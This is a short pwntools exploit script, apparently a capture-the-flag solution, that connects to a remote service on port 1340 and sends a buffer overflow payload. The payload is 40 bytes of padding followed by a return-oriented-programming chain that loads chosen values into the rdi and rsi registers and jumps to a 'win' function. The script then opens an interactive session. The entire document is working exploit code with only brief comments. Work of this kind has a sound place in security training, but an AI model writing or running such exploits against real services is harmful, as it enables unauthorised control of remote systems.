from pwn import *

p = remote("xxx.xx.xxx.xx", 1340)
context.log_level="debug"

# sending padding
#p.sendline(b"A"*40)

# user_id to put into rdi
user_id_addr = p64(0x0004010a3)
user_id = p64(0x0001337)

# passcode to put into rsi
passcode_addr = p64(0x0004010a1)
passcode = p64(0x00031337)
nonsense = p64(0x311337)

# win function
win_addr = p64(0x000400df8)

#overwrite the return address
#use gadget 1, pop RDI
p.sendline(b"A"*40 + user_id_addr + user_id + passcode_addr + passcode + nonsense + win_addr)

#toggle interactive mode
p.interactive()
